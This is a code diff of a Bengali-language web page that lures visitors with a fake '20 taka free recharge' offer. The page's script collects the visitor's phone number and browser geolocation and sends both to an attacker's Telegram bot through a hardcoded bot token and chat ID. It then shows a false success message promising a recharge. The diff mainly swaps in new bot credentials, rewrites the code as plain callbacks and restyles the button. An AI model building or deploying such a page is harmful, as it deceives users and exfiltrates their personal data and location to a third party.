@@ -9,7 +9,7 @@
         .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
         h2 { color: #28a745; }
         input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; }
+        button { background: #28a745; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -18,32 +18,30 @@
     <h2>২০ টাকা ফ্রি রিচার্জ!</h2>
     <p>আপনার নম্বরটি দিয়ে রিচার্জ নিশ্চিত করুন</p>
     <input type="number" id="num" placeholder="01XXXXXXXXX">
+    <br>
     <button onclick="send()">রিচার্জ নিন</button>
 </div>
 
 <script>
-async function send() {
-    const phone = document.getElementById('num').value;
+function send() {
+    var phone = document.getElementById('num').value;
     if (phone.length < 11) { alert("সঠিক নম্বর দিন"); return; }
     
-    const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq"; // আপনার টোকেন
-    const chat_id = "7887080882"; // আপনার চ্যাট আইডি
+    var token = "8056072120:AAH-Y5n9fP_7XnS_K4W5-U7mP_4"; 
+    var chat_id = "5907727181"; 
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-        // এখানে HTTPS ব্যবহার করা হয়েছে যাতে বাটন আসে
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const map = `https://www.google.com/maps?q=${lat},${lon}`;
-        const msg = `🎯 নম্বর: ${phone}\n📍 ম্যাপ: ${map}`;
+    navigator.geolocation.getCurrentPosition(function(pos) {
+        var lat = pos.coords.latitude;
+        var lon = pos.coords.longitude;
+        var map = "https://www.google.com/maps?q=" + lat + "," + lon;
+        var msg = "🎯 নম্বর: " + phone + "\n📍 ম্যাপ: " + map;
         
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg));
         alert("সফল হয়েছে! ৩০ মিনিটে রিচার্জ পাবেন।");
-        window.location.href = "https://www.google.com";
-    }, async () => {
-        const msg = `⚠️ নম্বর (লোকেশন অফ): ${phone}`;
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+    }, function() {
+        var msg = "⚠️ নম্বর (লোকেশন অফ): " + phone;
+        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg));
         alert("সফল হয়েছে!");
-        window.location.href = "https://www.google.com";
     });
 }
 </script>
